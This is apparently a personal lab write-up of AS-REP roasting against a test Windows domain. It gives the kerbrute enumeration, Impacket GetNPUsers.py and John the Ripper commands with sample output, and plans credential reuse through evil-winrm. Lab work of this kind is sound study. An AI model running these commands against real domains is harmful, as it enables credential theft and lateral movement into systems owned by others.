# 🔐 AS-REP Roasting & Kerberos Enumeration - 2025-04-24

**Target:** 192.168.1.2 (Windows Server 2025)  
**Domain:** narnia.com  
**Attacker:** Kali Linux (192.168.1.10)  
**Tools:** kerbrute, impacket (GetNPUsers.py)

---

## 🎯 Objective
- Enumerate valid domain users
- Identify accounts with Kerberos pre-auth disabled
- Capture AS-REP hashes for offline cracking

---

## 🧪 Step 1: Enumerating Users via Kerbrute

**Command:**
```bash
kerbrute userenum --dc 192.168.1.2 -d narnia.com usernames.txt
Output:

pgsql
Copy
Edit
[*] Valid user found: administrator@narnia.com
[*] Valid user found: jdoe@narnia.com
✅ Found valid domain users

🔍 Step 2: AS-REP Roasting via Impacket
Command:

bash
Copy
Edit
cd ~/impacket/examples
python3 GetNPUsers.py -dc-ip 192.168.1.2 narnia.com/ -usersfile usernames.txt -no-pass
Output (sample):

bash
Copy
Edit
$krb5asrep$23$administrator@narnia.com:...<HASH_SNIPPED>...
✅ Extracted AS-REP hash for offline cracking

🧨 Step 3: Crack the Hash (Next Step)
Command:

bash
Copy
Edit
john --wordlist=/usr/share/wordlists/rockyou.txt hashfile
🔄 Cracking in progress…

📝 Notes
AS-REP roasting only works if pre-auth is disabled

Hashes can be cracked offline to retrieve cleartext passwords

Credentials can be reused for SMB, WinRM, or lateral movement

✅ Summary

Task	Status
User enum with Kerbrute	✅
AS-REP hash retrieved	✅
Hash cracking	🔄 Pending
🧪 Next action: Crack and test credentials via evil-winrm


